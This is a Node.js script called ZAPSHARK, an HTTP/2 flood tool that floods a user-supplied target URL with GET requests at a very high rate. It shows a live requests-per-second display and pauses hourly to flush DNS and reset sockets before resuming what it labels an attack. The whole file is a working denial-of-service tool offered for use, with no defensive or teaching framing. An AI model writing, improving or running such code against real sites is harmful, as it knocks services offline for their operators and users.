const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000; // 1 hour
        this.maintenanceDuration = 600000;  // 10 minutes
        
        this.client = null;
        this.attackInterval = null;
    }

    async setupClient() {
        this.client = http2.connect(this.targetUrl);
        this.client.on('error', (err) => {});
    }

    sendRequest() {
        if (!this.client) return;

        try {
            const req = this.client.request({
                ':method': 'GET',
                ':path': '/'
            });
            
            req.on('response', () => {
                req.destroy();
            });
            
            req.end();
            
        } catch (err) {
            // Silent fail
        } finally {
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK: (${this.formatRuntime()}) | (${this.status})`);
        console.log('======================================');
        console.log(`T-ARP — ${this.totalRequests}`);
        console.log(`ARPS-S — ${this.currentRPS.toFixed(1)}`);
        console.log('======================================');
        console.log('©ZAP-SHARK — 2023 | V1');
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns', () => {});
        } else {
            exec('sudo dscacheutil -flushcache || sudo systemd-resolve --flush-caches', () => {});
        }
    }

    flushSockets() {
        if (this.client) {
            this.client.destroy();
            this.setupClient();
        }
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            this.status = "PAUSED";
            
            this.flushDNS();
            this.flushSockets();
            
            // Clear attack interval
            if (this.attackInterval) {
                clearInterval(this.attackInterval);
            }
            
            // Resume after 10 minutes
            setTimeout(() => {
                this.resumeAttack();
            }, this.maintenanceDuration);
            
            this.lastMaintenance = currentTime;
        }
    }

    resumeAttack() {
        this.status = "ATTACKING";
        this.lastMaintenance = Date.now();
        this.startAttack();
    }

    startAttack() {
        // POWER 2x - Double the attack speed
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                // Send 2 requests per interval for 2x power
                this.sendRequest();
                this.sendRequest();
                this.updateDisplay();
            }
        }, 0.1); // Same interval but double requests
    }

    async start() {
        // Clear terminal 2x on start
        process.stdout.write('\x1B[2J\x1B[0f');
        process.stdout.write('\x1B[2J\x1B[0f');
        
        await this.setupClient();
        
        this.startAttack();
        
        // Maintenance checker
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        // Handle exit
        process.on('SIGINT', () => {
            this.stop();
        });
    }

    stop() {
        this.running = false;
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        if (this.client) {
            this.client.destroy();
        }
        process.exit(0);
    }
}

// Usage
const target = process.argv[2] || 'https://example.com';
const shark = new ZAPSHARK(target);
shark.start();
